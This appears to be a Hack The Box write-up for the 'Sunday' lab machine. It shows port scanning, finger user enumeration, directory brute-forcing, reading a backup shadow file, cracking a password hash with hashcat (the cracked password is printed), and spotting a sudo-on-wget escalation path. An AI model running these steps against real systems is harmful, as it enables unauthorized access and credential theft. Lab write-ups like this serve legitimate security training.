---
title: HTB Sunday
author: kei5uke
draft: true
description: Writeup for HTB Sunday
tags:
  - solaris
  - writeup
---

# Port Scan

```
PORT      STATE SERVICE VERSION
79/tcp    open  finger?
|_finger: No one logged on\x0D
| fingerprint-strings: 
|   GenericLines: 
|     No one logged on
|   GetRequest: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|   HTTPOptions: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|     OPTIONS ???
|   Help: 
|     Login Name TTY Idle When Where
|     HELP ???
|   RTSPRequest: 
|     Login Name TTY Idle When Where
|     OPTIONS ???
|     RTSP/1.0 ???
|   SSLSessionReq, TerminalServerCookie: 
|_    Login Name TTY Idle When Where
111/tcp   open  rpcbind 2-4 (RPC #100000)
515/tcp   open  printer
6787/tcp  open  http    Apache httpd
|_http-server-header: Apache
|_http-title: 400 Bad Request
22022/tcp open  ssh     OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:00:94:32:18:60:a4:93:3b:87:a4:b6:f8:02:68:0e (RSA)
|_  256 da:2a:6c:fa:6b:b1:ea:16:1d:a6:54:a1:0b:2b:ee:48 (ED25519)
```

# Finger p79

```
┌──(root㉿kali)-[~/sunday]
└─# echo "root" | nc -vn 10.129.73.252 79
(UNKNOWN) [10.129.73.252] 79 (finger) open
Login       Name               TTY         Idle    When    Where
root     Super-User            console      <Dec  7, 2023>
                                                                                                                           
                                                                                                                            
┌──(root㉿kali)-[~/sunday]
└─# nmap -p 79 --script finger 10.129.73.252
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-21 16:26 EST
Nmap scan report for 10.129.73.252
Host is up (0.026s latency).

PORT   STATE SERVICE
79/tcp open  finger
|_finger: No one logged on\x0D

Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds
                                                                                                                            
┌──(root㉿kali)-[~/sunday]
└─# finger @10.129.73.252
No one logged on
```

```
┌──(root㉿kali)-[~/sunday/finger-user-enum]
└─# ./finger-user-enum.pl -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t sunday.htb
Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Worker Processes ......... 5
Usernames file ........... /usr/share/wordlists/seclists/Usernames/Names/names.txt
Target count ............. 1
Username count ........... 10713
Target TCP port .......... 79
Query timeout ............ 5 secs
Relay Server ............. Not used

######## Scan started at Sun Jan 25 07:10:45 2026 #########
access@sunday.htb: access No Access User                     < .  .  .  . >..nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >..
admin@sunday.htb: Login       Name               TTY         Idle    When    Where..adm      Admin                              < .  .  .  . >..dladm    Datalink Admin                     < .  .  .  . >..netadm   Network Admin                      < .  .  .  . >..netcfg   Network Configuratio               < .  .  .  . >..dhcpserv DHCP Configuration A               < .  .  .  . >..ikeuser  IKE Admin                          < .  .  .  . >..lp       Line Printer Admin                 < .  .  .  . >..
anne marie@sunday.htb: Login       Name               TTY         Idle    When    Where..anne                  ???..marie                 ???..
bin@sunday.htb: bin             ???                         < .  .  .  . >..
dee dee@sunday.htb: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..
ike@sunday.htb: ikeuser  IKE Admin                          < .  .  .  . >..
jo ann@sunday.htb: Login       Name               TTY         Idle    When    Where..ann                   ???..jo                    ???..
la verne@sunday.htb: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..
line@sunday.htb: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 < .  .  .  . >..
message@sunday.htb: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               < .  .  .  . >..
miof mela@sunday.htb: Login       Name               TTY         Idle    When    Where..mela                  ???..miof                  ???..
root@sunday.htb: root     Super-User            console      <Dec  7, 2023>..
sammy@sunday.htb: sammy           ???            ssh          <May  6, 2025> 10.10.14.68         ..
sunny@sunday.htb: sunny           ???            ssh          <Apr 13, 2022> 10.10.14.13         ..
sys@sunday.htb: sys             ???                         < .  .  .  . >..
zsa zsa@sunday.htb: Login       Name               TTY         Idle    When    Where..zsa                   ???..zsa                   ???..
######## Scan completed at Sun Jan 25 07:15:45 2026 #########
```

# Printer p515

```
┌──(root㉿kali)-[~/sunday]
└─# nc -nv 10.129.73.252 515
(UNKNOWN) [10.129.73.252] 515 (printer) open
```

# HTTPS p6787

![[HTB Sunday - image.png]]

```
┌──(root㉿kali)-[~/sunday]
└─# feroxbuster --url https://sunday:6787/ --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt --insecure -r
                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://sunday:6787/
 🚩  In-Scope Url          │ sunday
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       23w      196c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                 
403      GET        7l       20w      199c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                 
200      GET      114l      261w     3889c https://sunday:6787/solaris/
404      GET       12l       20w      154c https://sunday:6787/solaris/api
200      GET      183l      457w    10128c https://sunday:6787/solaris/login/
[####################] - 20s    90132/90132   0s      found:3       errors:528    
[####################] - 19s    30000/30000   1546/s  https://sunday:6787/ 
[####################] - 19s    30000/30000   1573/s  https://sunday:6787/solaris/ 
[####################] - 19s    30000/30000   1591/s  https://sunday:6787/solaris/login/ 
```

# Shell as sunny

Found user: sunny, sammy

`ssh sunny@sunny.htb -p 22022`

```
sunny@sunday:~$ cat .bash_history 
su -
su -
cat /etc/resolv.conf 
su -
ps auxwww|grep overwrite
su -
sudo -l
sudo /root/troll
ls /backup
ls -l /backup
cat /backup/shadow.backup
sudo /root/troll
sudo /root/troll
su -
sudo -l
sudo /root/troll
ps auxwww
ps auxwww
ps auxwww
top
top
top
ps auxwww|grep overwrite
su -
su -
cat /etc/resolv.conf 
ps auxwww|grep over
sudo -l
sudo /root/troll
sudo /root/troll
sudo /root/troll
sudo /root/troll
```

```
sunny@sunday:~$ cat /backup/shadow.backup 
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

Cracking sammy’s hash

`hashcat -m 7400 hash.txt /usr/share/wordlists/rockyou.txt`

\$5\$Ebkn8jlK\$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:`cooldude!`

```
-bash-5.1$ sudo -l
User sammy may run the following commands on sunday:
    (root) NOPASSWD: /usr/bin/wget
```

[wget | GTFOBins](https://gtfobins.org/gtfobins/wget/)
